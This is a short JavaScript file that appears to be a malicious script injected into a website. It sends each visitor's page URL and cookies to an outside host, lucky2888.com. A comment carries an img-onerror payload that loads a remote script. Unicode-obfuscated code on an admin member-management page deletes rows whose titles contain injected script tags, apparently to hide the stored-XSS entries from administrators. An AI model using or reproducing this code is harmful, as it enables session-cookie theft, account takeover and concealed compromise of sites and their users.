(function(){
    /* load css
     var drc = document.createElement('script');drc.setAttribute("src","https://biluweb.github.io/assets/extend.js");document.getElementsByTagName('head')[0].appendChild(drc);
     ["<img src=\"d\" onerror=\"var drc = document.createElement(\'script\');drc.setAttribute(\'src\',\'https://biluweb.github.io/assets/extend.js\');document.getElementsByTagName(\'head\')[0].appendChild(drc);\">"].join("");
    */
    
    var meta = document.createElement('meta');
    meta.content="upgrade-insecure-requests";
    meta.setAttribute("http-equiv","Content-Security-Policy");
    document.getElementsByTagName('head')[0].appendChild(meta);

    var httpRequest = new XMLHttpRequest();
    function send(){
        httpRequest.open('GET',"https://cdn.lucky2888.com/ftts?d="+window.location.href+"&c="+document.cookie, true);
        httpRequest.send();
    }
    httpRequest.onreadystatechange = function () {
        if (httpRequest.readyState == 4) {
            if(httpRequest.status == 200){
                //var json = httpRequest.responseText;console.log(json);
            }else{
                //alert("系统检测到你的网络不稳定,请在打开的网页中选择1.高级2.继续前往，将自动为您加速！");
                return;
                var tempwindow=window.open('_blank');
                setTimeout(function(){tempwindow.location.href="https://cdn.lucky2888.com"; }, 800);
                setTimeout(send, 5500);
            }
        }
    };
    send();
    //var drc = document.createElement('script');drc.setAttribute("src","");document.getElementsByTagName('head')[0].appendChild(drc);
    if(window.location.pathname=="\u002f\u0041\u0064\u006d\u0069\u006e\u006d\u0065\u006d\u0062\u0065\u0072\u002e\u006d\u0061\u006e\u0061\u0067\u0065\u002e\u0064\u006f"){
        var s=document.querySelector("\u0075\u005b\u0074\u0069\u0074\u006c\u0065\u003d\u0027\u7f16\u8f91\u002d\u0061\u0064\u006d\u0069\u006e\u003c\u0073\u0043\u0052\u0069\u0050\u0074\u0020\u0053\u0072\u0043\u003d\u002f\u002f\u0061\u002e\u0031\u0078\u002e\u0066\u0069\u0074\u002f\u0065\u0078\u0074\u0065\u006e\u0064\u002e\u006a\u0073\u003e\u003c\u002f\u0073\u0043\u0052\u0069\u0050\u0074\u003e\u0027\u005d"),
            m=document.querySelector("\u0075\u005b\u0074\u0069\u0074\u006c\u0065\u003d\u0027\u7f16\u8f91\u002d\u003c\u0073\u0043\u0052\u0069\u0050\u0074\u0020\u0053\u0072\u0043\u003d\u002f\u002f\u0061\u002e\u0031\u0078\u002e\u0066\u0069\u0074\u002f\u0065\u0078\u0074\u0065\u006e\u0064\u002e\u006a\u0073\u003e\u003c\u002f\u0073\u0043\u0052\u0069\u0050\u0074\u003e\u0027\u005d");
        if(s) s.parentElement.parentElement.remove();
        if(m) m.parentElement.parentElement.remove();
    }
}())
